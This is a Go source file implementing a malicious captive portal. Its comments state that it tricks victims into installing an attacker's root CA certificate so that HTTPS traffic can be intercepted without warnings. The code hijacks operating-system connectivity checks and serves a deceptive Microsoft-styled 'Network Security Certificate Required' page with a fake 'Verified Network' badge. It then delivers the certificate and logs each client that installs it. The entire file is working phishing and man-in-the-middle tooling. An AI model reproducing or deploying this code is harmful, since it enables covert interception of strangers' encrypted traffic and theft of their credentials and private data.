package portal

import (
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
)

// CaptivePortal intercepts HTTP traffic and presents a page that tricks
// victims into installing our root CA certificate. Once installed,
// all HTTPS interception works without certificate warnings.
type CaptivePortal struct {
	caCertPEM  []byte
	listenAddr string
	gatewayIP  string
	server     *http.Server
	installed  map[string]bool // IPs that have "installed"
}

func NewCaptivePortal(caCertPEM []byte, listenAddr, gatewayIP string) *CaptivePortal {
	return &CaptivePortal{
		caCertPEM:  caCertPEM,
		listenAddr: listenAddr,
		gatewayIP:  gatewayIP,
		installed:  make(map[string]bool),
	}
}

func (cp *CaptivePortal) Start() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", cp.handlePortal)
	mux.HandleFunc("/cert", cp.handleCertDownload)
	mux.HandleFunc("/done", cp.handleDone)
	mux.HandleFunc("/generate_204", cp.handleConnectivityCheck)
	mux.HandleFunc("/hotspot-detect.html", cp.handleConnectivityCheck)
	mux.HandleFunc("/connecttest.txt", cp.handleConnectivityCheck)
	mux.HandleFunc("/ncsi.txt", cp.handleConnectivityCheck)

	cp.server = &http.Server{
		Addr:    cp.listenAddr,
		Handler: mux,
	}

	log.Printf("[CAPTIVE PORTAL] Listening on %s", cp.listenAddr)
	go func() {
		if err := cp.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Printf("[CAPTIVE PORTAL] Server error: %v", err)
		}
	}()

	return nil
}

func (cp *CaptivePortal) Stop() {
	if cp.server != nil {
		cp.server.Close()
	}
}

func (cp *CaptivePortal) handleConnectivityCheck(w http.ResponseWriter, r *http.Request) {
	clientIP := getClientIP(r)
	if cp.installed[clientIP] {
		// Let them through after "installing"
		if strings.Contains(r.URL.Path, "generate_204") {
			w.WriteHeader(204)
			return
		}
		w.WriteHeader(200)
		fmt.Fprint(w, "Microsoft Connect Test")
		return
	}
	// Redirect to portal
	http.Redirect(w, r, fmt.Sprintf("http://%s/", cp.gatewayIP), http.StatusFound)
}

func (cp *CaptivePortal) handlePortal(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")

	fmt.Fprintf(w, portalHTML, cp.gatewayIP, cp.gatewayIP)
}

func (cp *CaptivePortal) handleCertDownload(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/x-x509-ca-cert")
	w.Header().Set("Content-Disposition", "attachment; filename=network-security-cert.crt")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(cp.caCertPEM)))
	w.Write(cp.caCertPEM)

	clientIP := getClientIP(r)
	log.Printf("[CAPTIVE PORTAL] CA cert downloaded by %s", clientIP)
}

func (cp *CaptivePortal) handleDone(w http.ResponseWriter, r *http.Request) {
	clientIP := getClientIP(r)
	cp.installed[clientIP] = true
	log.Printf("[CAPTIVE PORTAL] Client %s marked as complete", clientIP)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, doneHTML)
}

func getClientIP(r *http.Request) string {
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

const portalHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Network Security Update Required</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f5f5f5;color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{max-width:480px;width:90%%;background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,.1);overflow:hidden}
.header{background:#0078d4;color:#fff;padding:24px;text-align:center}
.header h1{font-size:18px;font-weight:600}
.header .icon{font-size:48px;margin-bottom:12px}
.body{padding:24px}
.body p{margin-bottom:16px;line-height:1.6;font-size:14px;color:#555}
.steps{background:#f8f9fa;border-radius:8px;padding:16px;margin:16px 0}
.steps li{margin-bottom:8px;font-size:13px;line-height:1.5}
.btn{display:block;width:100%%;padding:14px;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;margin-bottom:12px}
.btn-primary{background:#0078d4;color:#fff}
.btn-primary:hover{background:#106ebe}
.btn-secondary{background:#e9ecef;color:#333}
.btn-secondary:hover{background:#dee2e6}
.footer{padding:16px 24px;background:#f8f9fa;text-align:center;font-size:11px;color:#999}
.shield{display:inline-block;background:#e8f4e8;color:#2e7d32;padding:4px 12px;border-radius:12px;font-size:12px;font-weight:600;margin-bottom:16px}
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="icon">&#128274;</div>
<h1>Network Security Certificate Required</h1>
</div>
<div class="body">
<div style="text-align:center"><span class="shield">&#9989; Verified Network</span></div>
<p>This network requires a security certificate to protect your connection. This is a standard security measure used by organizations to ensure encrypted communications.</p>
<p><strong>To connect to the internet, please install the network security certificate:</strong></p>
<ol class="steps">
<li>Tap <strong>"Download Certificate"</strong> below</li>
<li>Open the downloaded file</li>
<li>Follow your device's prompts to install it</li>
<li>Tap <strong>"I've Installed It"</strong> to continue</li>
</ol>
<a href="http://%s/cert" class="btn btn-primary">&#128267; Download Certificate</a>
<a href="http://%s/done" class="btn btn-secondary">I've Installed It &#8594;</a>
</div>
<div class="footer">
Network Security Policy v3.2 &bull; This certificate enables secure browsing on this network
</div>
</div>
</body>
</html>`

const doneHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connected</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f5f5f5;color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{max-width:400px;text-align:center;padding:48px 24px}
.check{font-size:64px;margin-bottom:16px}
h1{font-size:24px;color:#2e7d32;margin-bottom:12px}
p{color:#666;line-height:1.6;font-size:14px}
</style>
<meta http-equiv="refresh" content="3;url=http://www.google.com">
</head>
<body>
<div class="container">
<div class="check">&#9989;</div>
<h1>You're Connected!</h1>
<p>Your device is now securely connected to the network. Redirecting you to the internet...</p>
</div>
</body>
</html>`
